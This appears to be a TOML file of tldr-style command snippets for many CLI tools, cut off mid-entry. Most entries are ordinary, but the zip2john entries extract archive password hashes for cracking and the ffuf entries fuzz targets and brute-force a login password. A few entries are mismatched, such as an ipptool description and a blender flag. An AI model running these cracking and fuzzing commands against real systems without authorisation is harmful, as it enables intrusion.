  description = "Display the current date using the RFC-3339 format (`YYYY-MM-DD hh:mm:ss TZ`)"
  command = "date --rfc-3339=s"
  output = ""

[[snippets]]
  description = "Set the current date using the format `MMDDhhmmYYYY.ss` (`YYYY` and `.ss` are optional)"
  command = "date <093023592021.59>"
  output = ""

[[snippets]]
  description = "Display the current ISO week number"
  command = "date +%V"
  output = ""

[[snippets]]
  description = "Display version"
  command = "cargo version"
  output = ""

[[snippets]]
  description = "Display additional build information"
  command = "cargo version --verbose"
  output = ""

[[snippets]]
  description = "Convert a PNM image to a CMYK encoded TIFF"
  command = "pnmtotiffcmyk <path/to/input_file.pnm> > <path/to/output_file.tiff>"
  output = ""

[[snippets]]
  description = "Specify the TIFF compression method"
  command = "pnmtotiffcmyk -<none|packbits|lzw> <path/to/input_file.pnm> > <path/to/output_file.tiff>"
  output = ""

[[snippets]]
  description = "Control the fill order"
  command = "pnmtotiffcmyk -<msb2lsb|lsb2msb> <path/to/input_file.pnm> > <path/to/output_file.tiff>"
  output = ""

[[snippets]]
  description = "Get all attributes and their values supported by a printer"
  command = "ipptool ipp://<printer_uri> get-completed-jobs.test"
  output = ""

[[snippets]]
  description = "Get the list of completed jobs of a printer"
  command = "ipptool ipp://<printer_uri> get-completed-jobs.test"
  output = ""

[[snippets]]
  description = "Send an email notification when a printer changes"
  command = "ipptool -d recipient=mailto:<email> ipp://<printer_uri> create-printer-subscription.test"
  output = ""

[[snippets]]
  description = "Create and authenticate a user with Google OIDC"
  command = "dexter auth -i <client_id> -s <client_secret>"
  output = ""

[[snippets]]
  description = "Override the default kube configuration file location"
  command = "dexter auth -i <client_id> -s <client_secret> --kube-config <sample/config>"
  output = ""

[[snippets]]
  description = "Dump database into an SQL-script file"
  command = "pg_dump <db_name> > <output_file.sql>"
  output = ""

[[snippets]]
  description = "Same as above, customize username"
  command = "pg_dump -U <username> <db_name> > <output_file.sql>"
  output = ""

[[snippets]]
  description = "Same as above, customize host and port"
  command = "pg_dump -h <host> -p <port> <db_name> > <output_file.sql>"
  output = ""

[[snippets]]
  description = "Dump a database into a custom-format archive file"
  command = "pg_dump -Fc <db_name> > <output_file.dump>"
  output = ""

[[snippets]]
  description = "Dump only database data into an SQL-script file"
  command = "pg_dump -a <db_name> > <path/to/output_file.sql>"
  output = ""

[[snippets]]
  description = "Dump only schema (data definitions) into an SQL-script file"
  command = "pg_dump -s <db_name> > <path/to/output_file.sql>"
  output = ""

[[snippets]]
  description = "Search for casks and formulae using a keyword"
  command = "brew search <keyword>"
  output = ""

[[snippets]]
  description = "Search for casks and formulae using a regular expression"
  command = "brew search /<regular_expression>/"
  output = ""

[[snippets]]
  description = "Enable searching through descriptions"
  command = "brew search --desc <keyword>"
  output = ""

[[snippets]]
  description = "Only search for formulae"
  command = "brew search --formula <keyword>"
  output = ""

[[snippets]]
  description = "Only search for casks"
  command = "brew search --cask <keyword>"
  output = ""

[[snippets]]
  description = "Run tests in the current directory. Note: Expects you to have a 'phpunit.xml'"
  command = "phpunit"
  output = ""

[[snippets]]
  description = "Run tests in a specific file"
  command = "phpunit <path/to/TestFile.php>"
  output = ""

[[snippets]]
  description = "Run tests annotated with the given group"
  command = "phpunit --group <name>"
  output = ""

[[snippets]]
  description = "Run tests and generate a coverage report in HTML"
  command = "phpunit --coverage-html <path/to/directory>"
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "csh"
  output = ""

[[snippets]]
  description = "Start an interactive shell session without loading startup configs"
  command = "csh -f"
  output = ""

[[snippets]]
  description = "Execute specific [c]ommands"
  command = "csh -c ""<echo 'csh is executed'>"""
  output = ""

[[snippets]]
  description = "Execute a specific script"
  command = "csh <path/to/script.csh>"
  output = ""

[[snippets]]
  description = "Create an App Configuration"
  command = "az appconfig create --name <name> --resource-group <group_name> --location <location>"
  output = ""

[[snippets]]
  description = "Delete a specific App Configuration"
  command = "az appconfig delete --resource-group <rg_name> --name <appconfig_name>"
  output = ""

[[snippets]]
  description = "List all App Configurations under the current subscription"
  command = "az appconfig list"
  output = ""

[[snippets]]
  description = "List all App Configurations under a specific resource group"
  command = "az appconfig list --resource-group <rg_name>"
  output = ""

[[snippets]]
  description = "Show properties of an App Configuration"
  command = "az appconfig show --name <appconfig_name>"
  output = ""

[[snippets]]
  description = "Update a specific App Configuration"
  command = "az appconfig update --resource-group <rg_name> --name <appconfig_name>"
  output = ""

[[snippets]]
  description = "Convert an SPC file to a PPM image"
  command = "spctoppm <path/to/input.spc> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "List of all settable options and whether they are set"
  command = "shopt"
  output = ""

[[snippets]]
  description = "Set an option"
  command = "shopt -s <option_name>"
  output = ""

[[snippets]]
  description = "Unset an option"
  command = "shopt -u <option_name>"
  output = ""

[[snippets]]
  description = "Print a list of all options and their status formatted as runnable `shopt` commands"
  command = "shopt -p"
  output = ""

[[snippets]]
  description = "Display help"
  command = "help shopt"
  output = ""

[[snippets]]
  description = "Record an application"
  command = "rr record <path/to/binary --arg1 --arg2>"
  output = ""

[[snippets]]
  description = "Replay latest recorded execution"
  command = "rr replay"
  output = ""

[[snippets]]
  description = "Build in the current directory"
  command = "ninja"
  output = ""

[[snippets]]
  description = "Build in the current directory, executing 4 jobs at a time in parallel"
  command = "ninja -j <4>"
  output = ""

[[snippets]]
  description = "Build a program in a given directory"
  command = "ninja -C <path/to/directory>"
  output = ""

[[snippets]]
  description = "Show targets (e.g. `install` and `uninstall`)"
  command = "ninja -t targets"
  output = ""

[[snippets]]
  description = "Display help"
  command = "ninja -h"
  output = ""

[[snippets]]
  description = "Extract the password hash from an archive, listing all files in the archive"
  command = "zip2john <path/to/file.zip>"
  output = ""

[[snippets]]
  description = "Extract the password hash using [o]nly a specific compressed file"
  command = "zip2john -o <path/to/compressed_file> <path/to/file.zip>"
  output = ""

[[snippets]]
  description = "Extract the password hash from a compressed file to a specific file (for use with John the Ripper)"
  command = "zip2john -o <path/to/compressed_file> <path/to/file.zip> > <file.hash>"
  output = ""

[[snippets]]
  description = "Compress a JPEG image"
  command = "guetzli <input.jpg> <output.jpg>"
  output = ""

[[snippets]]
  description = "Create a compressed JPEG from a PNG"
  command = "guetzli <input.png> <output.jpg>"
  output = ""

[[snippets]]
  description = "Compress a JPEG with the desired visual quality (84-100)"
  command = "guetzli --quality <quality_value> <input.jpg> <output.jpg>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr clang"
  output = ""

[[snippets]]
  description = "Download a video or playlist"
  command = "youtube-dl '<https://www.youtube.com/watch?v=oHg5SJYRHA0>'"
  output = ""

[[snippets]]
  description = "List all formats that a video or playlist is available in"
  command = "youtube-dl --list-formats '<https://www.youtube.com/watch?v=Mwa0_nE9H7A>'"
  output = ""

[[snippets]]
  description = "Download a video or playlist at a specific quality"
  command = "youtube-dl --format ""<best[height<=480]>"" '<https://www.youtube.com/watch?v=oHg5SJYRHA0>'"
  output = ""

[[snippets]]
  description = "Download the audio from a video and convert it to an MP3"
  command = "youtube-dl -x --audio-format <mp3> '<url>'"
  output = ""

[[snippets]]
  description = "Download the best quality audio and video and merge them"
  command = "youtube-dl -f bestvideo+bestaudio '<url>'"
  output = ""

[[snippets]]
  description = "Download video(s) as MP4 files with custom filenames"
  command = "youtube-dl --format <mp4> -o ""<%(playlist_index)s-%(title)s by %(uploader)s on %(upload_date)s in %(playlist)s.%(ext)s>"" '<url>'"
  output = ""

[[snippets]]
  description = "Download a particular language's subtitles along with the video"
  command = "youtube-dl --sub-lang <en> --write-sub '<https://www.youtube.com/watch?v=Mwa0_nE9H7A>'"
  output = ""

[[snippets]]
  description = "Download a playlist and extract MP3s from it"
  command = "youtube-dl -f ""bestaudio"" --continue --no-overwrites --ignore-errors --extract-audio --audio-format mp3 -o ""%(title)s.%(ext)s"" '<url_to_playlist>'"
  output = ""

[[snippets]]
  description = "Install a package from <http://atom.io/packages> or a theme from <http://atom.io/themes>"
  command = "apm install <package>"
  output = ""

[[snippets]]
  description = "Remove a package/theme"
  command = "apm remove <package>"
  output = ""

[[snippets]]
  description = "Upgrade a package/theme"
  command = "apm upgrade <package>"
  output = ""

[[snippets]]
  description = "Open the current directory in IntelliJ IDEA"
  command = "idea <path/to/directory>"
  output = ""

[[snippets]]
  description = "Open a specific file or directory in IntelliJ IDEA"
  command = "idea <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Open the diff viewer to compare up to 3 files"
  command = "idea diff <path/to/file1 path/to/file2 path/to/optional_file3>"
  output = ""

[[snippets]]
  description = "Open the merge dialog to perform a two-way file merge"
  command = "idea merge <path/to/file1> <path/to/file2> <path/to/output>"
  output = ""

[[snippets]]
  description = "Run code inspections on a project"
  command = "idea inspect <path/to/project_directory> <path/to/inspection_profile> <path/to/output>"
  output = ""

[[snippets]]
  description = "Delete all branches that were "squash-merged" into the current checked out branch"
  command = "git delete-squashed-branches"
  output = ""

[[snippets]]
  description = "Delete all branches that were "squash-merged" into a specific branch"
  command = "git delete-squashed-branches <branch_name>"
  output = ""

[[snippets]]
  description = "Extract pages 1-3, 5 and 6-10 from a PDF file and save them as another one"
  command = "pdftk <input.pdf> cat <1-3 5 6-10> output <output.pdf>"
  output = ""

[[snippets]]
  description = "Merge (concatenate) a list of PDF files and save the result as another one"
  command = "pdftk <file1.pdf file2.pdf ...> cat output <output.pdf>"
  output = ""

[[snippets]]
  description = "Split each page of a PDF file into a separate file, with a given filename output pattern"
  command = "pdftk <input.pdf> burst output <out_%d.pdf>"
  output = ""

[[snippets]]
  description = "Rotate all pages by 180 degrees clockwise"
  command = "pdftk <input.pdf> cat <1-endsouth> output <output.pdf>"
  output = ""

[[snippets]]
  description = "Rotate third page by 90 degrees clockwise and leave others unchanged"
  command = "pdftk <input.pdf> cat <1-2 3east 4-end> output <output.pdf>"
  output = ""

[[snippets]]
  description = "Launch Firefox and open a web page"
  command = "firefox <https://www.duckduckgo.com>"
  output = ""

[[snippets]]
  description = "Open a new window"
  command = "firefox --new-window <https://www.duckduckgo.com>"
  output = ""

[[snippets]]
  description = "Open a private (incognito) window"
  command = "firefox --private-window"
  output = ""

[[snippets]]
  description = "Search for "wikipedia" using the default search engine"
  command = "firefox --search ""<wikipedia>"""
  output = ""

[[snippets]]
  description = "Launch Firefox in safe mode, with all extensions disabled"
  command = "firefox --safe-mode"
  output = ""

[[snippets]]
  description = "Take a screenshot of a web page in headless mode"
  command = "firefox --headless --screenshot <path/to/output_file.png> <https://example.com/>"
  output = ""

[[snippets]]
  description = "Use a specific profile to allow multiple separate instances of Firefox to run at once"
  command = "firefox --profile <path/to/directory> <https://example.com/>"
  output = ""

[[snippets]]
  description = "Set Firefox as the default browser"
  command = "firefox --setDefaultBrowser"
  output = ""

[[snippets]]
  description = "Gzip several files at once, using all cores"
  command = "parallel gzip ::: <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Read arguments from `stdin`, run 4 jobs at once"
  command = "ls *.txt | parallel -j4 gzip"
  output = ""

[[snippets]]
  description = "Convert JPG images to PNG using replacement strings"
  command = "parallel convert {} {.}.png ::: *.jpg"
  output = ""

[[snippets]]
  description = "Parallel xargs, cram as many args as possible onto one command"
  command = "<args> | parallel -X <command>"
  output = ""

[[snippets]]
  description = "Break `stdin` into ~1M blocks, feed each block to `stdin` of new command"
  command = "cat <big_file.txt> | parallel --pipe --block 1M <command>"
  output = ""

[[snippets]]
  description = "Run on multiple machines via SSH"
  command = "parallel -S <machine1>,<machine2> <command> ::: <arg1> <arg2>"
  output = ""

[[snippets]]
  description = "Download 4 files simultaneously from a text file containing links showing progress"
  command = "parallel -j4 --bar --eta wget -q {} :::: <path/to/links.txt>"
  output = ""

[[snippets]]
  description = "Print the jobs which `parallel` is running in `stderr`"
  command = "parallel -t <command> ::: <args>"
  output = ""

[[snippets]]
  description = "Run AdGuard Home"
  command = "AdGuardHome"
  output = ""

[[snippets]]
  description = "Specify a configuration file"
  command = "AdGuardHome --config <path/to/AdGuardHome.yaml>"
  output = ""

[[snippets]]
  description = "Store the data in a specific work directory"
  command = "AdGuardHome --work-dir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Install or uninstall AdGuard Home as a service"
  command = "AdGuardHome --service <install|uninstall>"
  output = ""

[[snippets]]
  description = "Start the AdGuard Home service"
  command = "AdGuardHome --service start"
  output = ""

[[snippets]]
  description = "Reload the configuration for the AdGuard Home service"
  command = "AdGuardHome --service reload"
  output = ""

[[snippets]]
  description = "Stop or restart the AdGuard Home service"
  command = "AdGuardHome --service <stop|restart>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "dolt version"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr nc"
  output = ""

[[snippets]]
  description = "List all available project targets"
  command = "pio run --list-targets"
  output = ""

[[snippets]]
  description = "List all available project targets of a specific environment"
  command = "pio run --list-targets --environment <environment>"
  output = ""

[[snippets]]
  description = "Run all targets"
  command = "pio run"
  output = ""

[[snippets]]
  description = "Run all targets of specified environments"
  command = "pio run --environment <environment1> --environment <environment2>"
  output = ""

[[snippets]]
  description = "Run specified targets"
  command = "pio run --target <target1> --target <target2>"
  output = ""

[[snippets]]
  description = "Run the targets of a specified configuration file"
  command = "pio run --project-conf <path/to/platformio.ini>"
  output = ""

[[snippets]]
  description = "Setup up `chezmoi`, creating a Git repository in `~/.local/share/chezmoi`"
  command = "chezmoi init"
  output = ""

[[snippets]]
  description = "Start tracking one or more dotfiles"
  command = "chezmoi add <path/to/dotfile1 path/to/dotfile2 ...>"
  output = ""

[[snippets]]
  description = "Edit the source state of a tracked dotfile"
  command = "chezmoi edit <path/to/dotfile_or_symlink>"
  output = ""

[[snippets]]
  description = "See pending changes"
  command = "chezmoi diff"
  output = ""

[[snippets]]
  description = "Apply the changes"
  command = "chezmoi -v apply"
  output = ""

[[snippets]]
  description = "Set up `chezmoi` from existing dotfiles of a Git repository"
  command = "chezmoi init <repository_url>"
  output = ""

[[snippets]]
  description = "Pull changes from a remote repository and apply them"
  command = "chezmoi update"
  output = ""

[[snippets]]
  description = "Add a file to the index"
  command = "git add <path/to/file>"
  output = ""

[[snippets]]
  description = "Add all files (tracked and untracked)"
  command = "git add -A"
  output = ""

[[snippets]]
  description = "Only add already tracked files"
  command = "git add -u"
  output = ""

[[snippets]]
  description = "Also add ignored files"
  command = "git add -f"
  output = ""

[[snippets]]
  description = "Interactively stage parts of files"
  command = "git add -p"
  output = ""

[[snippets]]
  description = "Interactively stage parts of a given file"
  command = "git add -p <path/to/file>"
  output = ""

[[snippets]]
  description = "Interactively stage a file"
  command = "git add -i"
  output = ""

[[snippets]]
  description = "Compile a Lua source file to Lua bytecode"
  command = "luac -o <byte_code.luac> <source.lua>"
  output = ""

[[snippets]]
  description = "Do not include debug symbols in the output"
  command = "luac -s -o <byte_code.luac> <source.lua>"
  output = ""

[[snippets]]
  description = "Convert a TrueVision Targa file to a PPM image"
  command = "tgatoppm <path/to/file.tga> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Dump information from the TGA header to `stdout`"
  command = "tgatoppm --headerdump <path/to/file.tga> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Write the transparency channel values of the input image to the specified file"
  command = "tgatoppm --alphaout <path/to/transparency_file.pgm> <path/to/file.tga> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "tgatoppm -version"
  output = ""

[[snippets]]
  description = "Initialize a backup repository in the specified local directory"
  command = "restic init --repo <path/to/repository>"
  output = ""

[[snippets]]
  description = "Backup a directory to the repository"
  command = "restic --repo <path/to/repository> backup <path/to/directory>"
  output = ""

[[snippets]]
  description = "Show backup snapshots currently stored in the repository"
  command = "restic --repo <path/to/repository> snapshots"
  output = ""

[[snippets]]
  description = "Restore a specific backup snapshot to a target directory"
  command = "restic --repo <path/to/repository> restore <latest|snapshot_id> --target <path/to/target>"
  output = ""

[[snippets]]
  description = "Restore a specific path from a specific backup to a target directory"
  command = "restic --repo <path/to/repository> restore <snapshot_id> --target <path/to/target> --include <path/to/restore>"
  output = ""

[[snippets]]
  description = "Clean up the repository and keep only the most recent snapshot of each unique backup"
  command = "restic forget --keep-last 1 --prune"
  output = ""

[[snippets]]
  description = "Shear a PNM image by the specified angle"
  command = "pnmshear <angle> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Specify the color of the background in the sheared image"
  command = "pnmshear -background <blue> <angle> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Do not perform anti-aliasing"
  command = "pnmshear -noantialias <angle> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Install a PHP version globally"
  command = "phpenv install <version>"
  output = ""

[[snippets]]
  description = "Refresh shim files for all PHP binaries known to `phpenv`"
  command = "phpenv rehash"
  output = ""

[[snippets]]
  description = "List all installed PHP versions"
  command = "phpenv versions"
  output = ""

[[snippets]]
  description = "Display the currently active PHP version"
  command = "phpenv version"
  output = ""

[[snippets]]
  description = "Set the global PHP version"
  command = "phpenv global <version>"
  output = ""

[[snippets]]
  description = "Set the local PHP version, which overrides the global version"
  command = "phpenv local <version>"
  output = ""

[[snippets]]
  description = "Unset the local PHP version"
  command = "phpenv local --unset"
  output = ""

[[snippets]]
  description = "Recognize characters in the [i]nput image and [o]utput it in the given file. Put the database ([p]) in `path/to/db_directory` (verify that the folder exists or DB usage will silently be skipped). [m]ode 130 means create + use + extend database"
  command = "gocr -m 130 -p <path/to/db_directory> -i <path/to/input_image.png> -o <path/to/output_file.txt>"
  output = ""

[[snippets]]
  description = "Recognize characters and assume all [C]haracters are numbers"
  command = "gocr -m 130 -p <path/to/db_directory> -i <path/to/input_image.png> -o <path/to/output_file.txt> -C ""<0..9>"""
  output = ""

[[snippets]]
  description = "Recognize characters with a cert[a]inty of 100% (characters have a higher chance to be treated as unknown)"
  command = "gocr -m 130 -p <path/to/db_directory> -i <path/to/input_image.png> -o <path/to/output_file.txt> -a 100"
  output = ""

[[snippets]]
  description = "Parse and transform a CSS file"
  command = "postcss <path/to/file>"
  output = ""

[[snippets]]
  description = "Parse and transform a CSS file and output to a specific file"
  command = "postcss <path/to/file> --output <path/to/file>"
  output = ""

[[snippets]]
  description = "Parse and transform a CSS file and output to a specific directory"
  command = "postcss <path/to/file> --dir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Parse and transform a CSS file in-place"
  command = "postcss <path/to/file> --replace"
  output = ""

[[snippets]]
  description = "Specify a custom PostCSS parser"
  command = "postcss <path/to/file> --parser <parser>"
  output = ""

[[snippets]]
  description = "Specify a custom PostCSS syntax"
  command = "postcss <path/to/file> --syntax <syntax>"
  output = ""

[[snippets]]
  description = "Watch for changes to a CSS file"
  command = "postcss <path/to/file> --watch"
  output = ""

[[snippets]]
  description = "Display help"
  command = "postcss --help"
  output = ""

[[snippets]]
  description = "Open a file with the associated application"
  command = "open <path/to/file.ext>"
  output = ""

[[snippets]]
  description = "Open all the files of a given extension in the current directory with the associated application"
  command = "open <*.ext>"
  output = ""

[[snippets]]
  description = "Open a directory using the default file manager"
  command = "open <path/to/directory>"
  output = ""

[[snippets]]
  description = "Open a website using the default web browser"
  command = "open <https://example.com>"
  output = ""

[[snippets]]
  description = "Open a specific URI using the default application that can handle it"
  command = "open <tel:123>"
  output = ""

[[snippets]]
  description = "Create a blank bitmap of the specified dimensions"
  command = "pbmmake <width> <height> > <path/to/output_file.pbm>"
  output = ""

[[snippets]]
  description = "Specify the color of the created bitmap"
  command = "pbmmake -<white|black|grey> <width> <height> > <path/to/output_file.pbm>"
  output = ""

[[snippets]]
  description = "Convert a PPM image to an X11 puzzle file"
  command = "ppmtopuzz <path/to/file.ppm> > <path/to/file.puzz>"
  output = ""

[[snippets]]
  description = "Analyze text from `stdin`"
  command = "echo <His network looks good> | alex --stdin"
  output = ""

[[snippets]]
  description = "Analyze all files in the current directory"
  command = "alex"
  output = ""

[[snippets]]
  description = "Analyze a specific file"
  command = "alex <path/to/file.md>"
  output = ""

[[snippets]]
  description = "Analyze all Markdown files except `example.md`"
  command = "alex *.md !<example.md>"
  output = ""

[[snippets]]
  description = "Read 4096 bytes from the device starting from 0x8000000"
  command = "st-flash read <firmware>.bin <0x8000000> <4096>"
  output = ""

[[snippets]]
  description = "Write firmware to device starting from 0x8000000"
  command = "st-flash write <firmware>.bin <0x8000000>"
  output = ""

[[snippets]]
  description = "Erase firmware from device"
  command = "st-flash erase"
  output = ""

[[snippets]]
  description = "Reject print jobs to the specified destinations"
  command = "cupsreject <destination1 destination2 ...>"
  output = ""

[[snippets]]
  description = "Specify a different server"
  command = "cupsreject -h <server> <destination1 destination2 ...>"
  output = ""

[[snippets]]
  description = "Specify a reason string ("Reason Unknown" by default)"
  command = "cupsreject -r <reason> <destination1 destination2 ...>"
  output = ""

[[snippets]]
  description = "Forward all IPv4 TCP traffic via a remote SSH server"
  command = "sshuttle --remote=<username>@<sshserver> <0.0.0.0/0>"
  output = ""

[[snippets]]
  description = "Also forward all DNS traffic to the server's default DNS resolver"
  command = "sshuttle --dns --remote=<username>@<sshserver> <0.0.0.0/0>"
  output = ""

[[snippets]]
  description = "Forward all traffic except that which is bound for a specific subnet"
  command = "sshuttle --remote=<username>@<sshserver> <0.0.0.0/0> --exclude <192.168.0.1/24>"
  output = ""

[[snippets]]
  description = "Use the tproxy method to forward all IPv4 and IPv6 traffic"
  command = "sshuttle --method=tproxy --remote=<username>@<sshserver> <0.0.0.0/0> <::/0> --exclude=<your_local_ip_address> --exclude=<ssh_server_ip_address>"
  output = ""

[[snippets]]
  description = "Produce a relief of the specified PPM image"
  command = "ppmrelief <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Connect to a host and run the current shell"
  command = "xxh ""<host>"""
  output = ""

[[snippets]]
  description = "Install the current shell into the target machine without prompting"
  command = "xxh ""<host>"" ++install"
  output = ""

[[snippets]]
  description = "Run the specified shell on the target machine"
  command = "xxh ""<host>"" ++shell <xonsh|zsh|fish|bash|osquery>"
  output = ""

[[snippets]]
  description = "Use a specific xxh configuration directory on the target machine"
  command = "xxh ""<host>"" ++host-xxh-home <~/.xxh>"
  output = ""

[[snippets]]
  description = "Use the specified configuration file on the host machine"
  command = "xxh ""<host>"" ++xxh-config <~/.config/xxh/config.xxhc>"
  output = ""

[[snippets]]
  description = "Specify a password to use for the SSH connection"
  command = "xxh ""<host>"" ++password ""<password>"""
  output = ""

[[snippets]]
  description = "Install an xxh package on the target machine"
  command = "xxh ""<host>"" ++install-xxh-packages <package>"
  output = ""

[[snippets]]
  description = "Set an environment variable for the shell process on the target machine"
  command = "xxh ""<host>"" ++env <name>=<value>"
  output = ""

[[snippets]]
  description = "Start runit's 3-stage init scheme"
  command = "runit"
  output = ""

[[snippets]]
  description = "Shut down runit"
  command = "kill --CONT <runit_pid>"
  output = ""

[[snippets]]
  description = "Create an empty temporary file and print its absolute path"
  command = "mktemp"
  output = ""

[[snippets]]
  description = "Use a custom directory if `$TMPDIR` is not set (the default is platform-dependent, but usually `/tmp`)"
  command = "mktemp -p </path/to/tempdir>"
  output = ""

[[snippets]]
  description = "Use a custom path template (`X`s are replaced with random alphanumeric characters)"
  command = "mktemp </tmp/example.XXXXXXXX>"
  output = ""

[[snippets]]
  description = "Use a custom file name template"
  command = "mktemp -t <example.XXXXXXXX>"
  output = ""

[[snippets]]
  description = "Create an empty temporary directory and print its absolute path"
  command = "mktemp -d"
  output = ""

[[snippets]]
  description = "Create a new Django project"
  command = "django-admin startproject <project_name>"
  output = ""

[[snippets]]
  description = "Create a new app for the current project"
  command = "django-admin startapp <app_name>"
  output = ""

[[snippets]]
  description = "Check the current version of Django"
  command = "django-admin --version"
  output = ""

[[snippets]]
  description = "Display help for a specific command"
  command = "django-admin help <command>"
  output = ""

[[snippets]]
  description = "Display available options"
  command = "clangd --help"
  output = ""

[[snippets]]
  description = "List of available options"
  command = "clangd --help-list"
  output = ""

[[snippets]]
  description = "Display version"
  command = "clangd --version"
  output = ""

[[snippets]]
  description = "Start the commit wizard"
  command = "gitmoji --commit"
  output = ""

[[snippets]]
  description = "Initialize the Git hook (so `gitmoji` will be run every time `git commit` is run)"
  command = "gitmoji --init"
  output = ""

[[snippets]]
  description = "Remove the Git hook"
  command = "gitmoji --remove"
  output = ""

[[snippets]]
  description = "List all available emojis and their descriptions"
  command = "gitmoji --list"
  output = ""

[[snippets]]
  description = "Search emoji list for a list of keywords"
  command = "gitmoji --search <keyword1> <keyword2>"
  output = ""

[[snippets]]
  description = "Update cached list of emojis from main repository"
  command = "gitmoji --update"
  output = ""

[[snippets]]
  description = "Configure global preferences"
  command = "gitmoji --config"
  output = ""

[[snippets]]
  description = "Launch tuir"
  command = "tuir"
  output = ""

[[snippets]]
  description = "Open a subreddit"
  command = "/<subreddit_name>"
  output = ""

[[snippets]]
  description = "Open a link"
  command = "o"
  output = ""

[[snippets]]
  description = "Open a specific subreddit on launch"
  command = "tuir -s <subreddit_name>"
  output = ""

[[snippets]]
  description = "Open external links using programs defined in the mailcap config"
  command = "tuir --enable-media"
  output = ""

[[snippets]]
  description = "Compare two files"
  command = "diffoscope <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Compare two files without displaying a progress bar"
  command = "diffoscope --no-progress <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Compare two files and write an HTML-report to a file (use `-` for `stdout`)"
  command = "diffoscope --html <path/to/outfile|-> <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Compare two directories excluding files with a name matching a specified pattern"
  command = "diffoscope --exclude <pattern> <path/to/directory1> <path/to/directory2>"
  output = ""

[[snippets]]
  description = "Compare two directories and control whether directory metadata is considered"
  command = "diffoscope --exclude-directory-metadata <auto|yes|no|recursive> <path/to/directory1> <path/to/directory2>"
  output = ""

[[snippets]]
  description = "Execute a command over SSH"
  command = "pyinfra <target_ip_address> exec -- <command_name_and_arguments>"
  output = ""

[[snippets]]
  description = "Execute contents of a deploy file on a list of targets"
  command = "pyinfra <path/to/target_list.py> <path/to/deploy.py>"
  output = ""

[[snippets]]
  description = "Execute commands on locally"
  command = "pyinfra @local <path/to/deploy.py>"
  output = ""

[[snippets]]
  description = "Execute commands over Docker"
  command = "pyinfra @docker/<container> <path/to/deploy.py>"
  output = ""

[[snippets]]
  description = "Assemble `source.asm` into a binary file `source`, in the (default) raw binary format"
  command = "nasm <source.asm>"
  output = ""

[[snippets]]
  description = "Assemble `source.asm` into a binary file `output_file`, in the specified format"
  command = "nasm -f <format> <source.asm> -o <output_file>"
  output = ""

[[snippets]]
  description = "List valid output formats (along with basic nasm help)"
  command = "nasm -hf"
  output = ""

[[snippets]]
  description = "Assemble and generate an assembly listing file"
  command = "nasm -l <list_file> <source.asm>"
  output = ""

[[snippets]]
  description = "Add a directory (must be written with trailing slash) to the include file search path before assembling"
  command = "nasm -i <path/to/include_dir/> <source.asm>"
  output = ""

[[snippets]]
  description = "Render all frames of an animation in the background, without loading the UI (output is saved to `/tmp`)"
  command = "blender --background <path/to/file.blend> --render-anim"
  output = ""

[[snippets]]
  description = "Render an animation using a specific image naming pattern, in a path relative (`//`) to the .blend file"
  command = "blender --background <path/to/file.blend> --render-output //<render/frame_###.png> --render-anim"
  output = ""

[[snippets]]
  description = "Render the 10th frame of an animation as a single image, saved to an existing directory (absolute path)"
  command = "blender --background <path/to/file.blend> --render-output </path/to/output_directory> --render-frame <10>"
  output = ""

[[snippets]]
  description = "Render the second last frame in an animation as a JPEG image, saved to an existing directory (relative path)"
  command = "blender --background <path/to/file.blend> --render-output //<output_directory> --render-frame <JPEG> --render-frame <-2>"
  output = ""

[[snippets]]
  description = "Render the animation of a specific scene, starting at frame 10 and ending at frame 500"
  command = "blender --background <path/to/file.blend> --scene <scene_name> --frame-start <10> --frame-end <500> --render-anim"
  output = ""

[[snippets]]
  description = "Render an animation at a specific resolution, by passing a Python expression"
  command = "blender --background <path/to/file.blend> --python-expr '<import bpy; bpy.data.scenes[0].render.resolution_percentage = 25>' --render-anim"
  output = ""

[[snippets]]
  description = "Start an interactive Blender session in the terminal with a Python console (do `import bpy` after starting)"
  command = "blender --background --python-console"
  output = ""

[[snippets]]
  description = "Enumerate directories using [c]olored output and a [w]ordlist specifying a target [u]RL"
  command = "ffuf -c -w <path/to/wordlist.txt> -u <http://target/FUZZ>"
  output = ""

[[snippets]]
  description = "Enumerate subdomains by changing the position of the keyword"
  command = "ffuf -w <path/to/subdomains.txt> -u <http://FUZZ.target.com>"
  output = ""

[[snippets]]
  description = "Fuzz with specified [t]hreads (default: 40) and pro[x]ying the traffic and save [o]utput to a file"
  command = "ffuf -o -w <path/to/wordlist.txt> -u <http://target/FUZZ> -t <500> -x <http://127.0.0.1:8080>"
  output = ""

[[snippets]]
  description = "Fuzz a specific [H]eader ("Name: Value") and [m]atch HTTP status [c]odes"
  command = "ffuf -w <path/to/wordlist.txt> -u <http://target.com> -H ""<Host: FUZZ>"" -mc <200>"
  output = ""

[[snippets]]
  description = "Fuzz with specified HTTP method and payloa[d], while [f]iltering out comma separated status [c]odes"
  command = "ffuf -w <path/to/postdata.txt> -X <POST> -d ""<username=admin\&password=FUZZ>"" -u <http://target/login.php> -fc <401,403>"
  output = ""

[[snippets]]
  description = "Run the default task process"
  command = "grunt"
  output = ""

[[snippets]]
  description = "Run one or more tasks"
  command = "grunt <task1 task2 ...>"
  output = ""

[[snippets]]
  description = "Specify an alternative configuration file"
  command = "grunt --gruntfile <path/to/file>"
  output = ""

[[snippets]]
  description = "Specify an alternative base path for relative files"
  command = "grunt --base <path/to/directory>"
  output = ""

[[snippets]]
  description = "Specify an additional directory to scan for tasks in"
